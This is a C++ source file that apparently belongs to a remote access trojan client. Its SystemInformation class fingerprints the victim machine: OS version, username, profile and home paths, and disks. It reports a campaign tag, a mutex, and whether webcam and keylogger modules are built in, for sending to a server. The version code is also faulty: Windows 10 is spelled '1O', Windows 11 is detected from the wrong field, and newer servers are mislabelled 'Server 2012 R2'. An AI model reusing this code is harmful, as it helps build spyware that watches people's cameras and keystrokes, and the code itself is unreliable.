#include "SystemInformation.h"
#include "json.hpp"


std::string SystemInformation::getWindowsVersion() {
    OSVERSIONINFOEX info;
    ZeroMemory(&info, sizeof(OSVERSIONINFOEX));
    info.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
    GetVersionEx((LPOSVERSIONINFO) &info);

    std::string str = "Windows ";
    if (info.dwMajorVersion == 6) {
        if (info.dwMinorVersion == 0) {
            if (info.wProductType == VER_NT_WORKSTATION)
                str.append("Vista");
            else str.append("Server 2008");
        } else if (info.dwMinorVersion == 1) {
            if (info.wProductType == VER_NT_WORKSTATION)
                str.append("7");
            else str.append("Server 2008 R2");
        } else if (info.dwMinorVersion == 2) {
            if (info.wProductType == VER_NT_WORKSTATION)
                str.append("8");
            else str.append("Server 2012");
        } else if (info.dwMinorVersion == 3) {
            if (info.wProductType == VER_NT_WORKSTATION)
                str.append("8.1");
            else str.append("Server 2012 R2");
        }
    } else if (info.dwMajorVersion >= 10) {
        if (info.wProductType == VER_NT_WORKSTATION) {
            if (info.dwMinorVersion > 22000)
                str.append("11");
            else
                str.append("1O");
        } else str.append("Server 2012 R2");

    }
    std::cout << info.dwMinorVersion;
    return str;
}


std::string SystemInformation::getUsername() {
    char username[UNLEN + 1];
    DWORD username_len = UNLEN + 1;
    GetUserName(username, &username_len);
    std::string str(username);
    return str;
}


// Creating vector with all information related to the system
nlohmann::json SystemInformation::getSystemInformation() {
    nlohmann::json json;
    json["win_ver"] = getWindowsVersion();
    json["user_profile"] = getenv("USERPROFILE");
    json["home_path"] =  getenv("HOMEPATH");
    json["home_drive"] =  getenv("HOMEDRIVE");
    json["username"] = getUsername();
    json["disks"] = FileManager::getDisks();
    json["tag_name"] = TAG_NAME;
    json["mutex"] = MUTEX;
    // Add or not modules to server
#ifdef WEBCAM
    json["webcam"] = true;
#else
    json["webcam"] = false;
#endif
#ifdef KEYLOGGER_DEF
    json["keylogger"] = true;
#else
    json["keylogger"] = false;
#endif
    return json;
}

